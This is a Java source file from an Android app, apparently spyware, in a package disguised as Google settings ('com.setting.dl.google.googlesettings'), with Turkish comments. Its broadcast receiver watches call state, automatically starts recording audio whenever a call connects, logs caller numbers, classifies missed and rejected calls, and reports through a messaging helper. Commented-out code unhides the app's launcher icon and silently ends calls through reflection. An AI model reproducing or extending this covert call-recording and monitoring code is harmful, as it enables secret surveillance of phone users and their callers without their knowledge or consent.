package com.setting.dl.google.googlesettings.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import com.setting.dl.google.googlesettings.AudioRecord;
import com.setting.dl.google.googlesettings.phone.Calls;
import com.setting.dl.google.googlesettings.phone.Contacts;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;

import static android.telephony.TelephonyManager.EXTRA_STATE_IDLE;


public abstract class CallManagerBase extends BroadcastReceiver {
	
	private static int lastState = TelephonyManager.CALL_STATE_IDLE;
	private static Date callStartTime;
	private static boolean isIncoming;
	private static String numberSaved;
	protected Context context;
	private static CallRecord callRecorder;
	
	
	@Override
	public void onReceive(Context context, Intent intent) {
		
		if(intent == null) return;
		
		String action = intent.getAction();
		Bundle bundle = intent.getExtras();
		
		if (action == null || bundle == null) {
			
			u.log.w("action veya bundle null");
			return;
		}
		
		this.context = context.getApplicationContext();
		
		if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			
			numberSaved = Contacts.normalizeNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
			
		}
		
		
		if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
			
			String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
			String number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
			
			int state = 0;
			
			if (stateStr != null) {
				
				if (stateStr.equals(EXTRA_STATE_IDLE)) {
					
					state = TelephonyManager.CALL_STATE_IDLE;
				}
				else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
					
					state = TelephonyManager.CALL_STATE_OFFHOOK;
				}
				else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					
					state = TelephonyManager.CALL_STATE_RINGING;
				}
				
				u.log.d("number : " + number);
				onCallStateChanged(this.context, state, number);
			}
			
		}
	}
	
	private void onCallStateChanged(final Context context, int state, String number) {
		
		if (lastState == state) return;
		
		//if(number == null) number = "number_null_" + AudioRecord.getDateForFile(new Date());
		
		
		switch (state) {
			
			case TelephonyManager.CALL_STATE_RINGING:
				
				callStartTime = new Date();// çağrının zamanı
				isIncoming = true;
				//String caller = Contacts.getContactNameWithNumber(context, number);
				
				u.log.d("Gelen arama var : %s", number);
				
				//onIncomingCallReceiving(context, number, callStartTime);
				
				break;
			
			case TelephonyManager.CALL_STATE_OFFHOOK:
				
				callStartTime = new Date();
				
				isIncoming = lastState == TelephonyManager.CALL_STATE_RINGING;
				
				if (!AudioRecord.isRunning()) {
					
					callRecorder = new CallRecord(context, number).startRecord();
				}
				else{
					
					u.sendMessage(context, "CallManager", "There is a audiorecord, ignoring callrecord");
				}
				
				break;
			
			case TelephonyManager.CALL_STATE_IDLE:
				
				if (callRecorder != null) {
					
					callRecorder.stopRecord();
					callRecorder = null;
				}
				
				if (lastState == TelephonyManager.CALL_STATE_RINGING) {
					//telefon çalmış ama cevap verilmemiş
					//yani cevapsız çağrı
					//ya da arama reddedildi
					//onMissedCall(context, number, callStartTime);
					
					final String finalNumber = number;
					
					//aramalar arama kaydına görüşme bittikten sonra ekleniyor
					//biz de kendimizden extra 2 saniye müsade veriyoruz ve kontrol ediyoruz
					u.run(() -> {
						
						if (Calls.isRejected(context, finalNumber, callStartTime.getTime())) {
							
							onCallRejected(context, finalNumber, callStartTime);
						}
						else {
							
							onMissedCall(context, finalNumber, callStartTime);
						}
						
						
					}, 3000 /* 3 saniye müsade et*/);
					
				}
				else {
					
					
					if (isIncoming) {
						//gelen arama olmuş ve görüşme bitmiş
						onIncomingCallEnded(context, number, callStartTime, new Date());
					}
					else {
						//giden arama olmuş ve görüşme bitmiş
						onOutgoingCallEnded(context, numberSaved, callStartTime, new Date());
					}
				}
				
				
				
				break;
		}
		
		lastState = state;
	}
	
	//protected abstract void onIncomingCallReceiving(Context context, String number, Date start);
	
	protected abstract void onMissedCall(Context context, String number, Date start);
	
	protected abstract void onCallRejected(Context context, String numberSaved, Date callStartTime);
	
	protected abstract void onIncomingCallEnded(Context context, String number, Date start, Date end);
	
	protected abstract void onOutgoingCallEnded(Context context, String number, Date start, Date end);
    
    /*protected abstract void onOutgoingCallStarted(Context context, String number, Date start);
    
    protected abstract void onIncomingCallAnswered(Context context, String number, Date start);
    
    private void showApp() {
        
        PackageManager packageManager = context.getPackageManager();
        ComponentName  componentName  = new ComponentName(context, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        
    }
    
    
    private void endCall(){
    
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        ITelephony       telephonyService;
    
    
        try {
    
            Class  c;
            
            if (telephonyManager != null) {
    
                c = Class.forName(telephonyManager.getClass().getName());
    
                Method m;
                if (c != null) {
                    m = c.getDeclaredMethod("getITelephony");
    
                    m.setAccessible(true);
                    telephonyService = (ITelephony) m.invoke(telephonyManager);
                    telephonyService.silenceRinger();
                    telephonyService.endCall();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }*/
	
}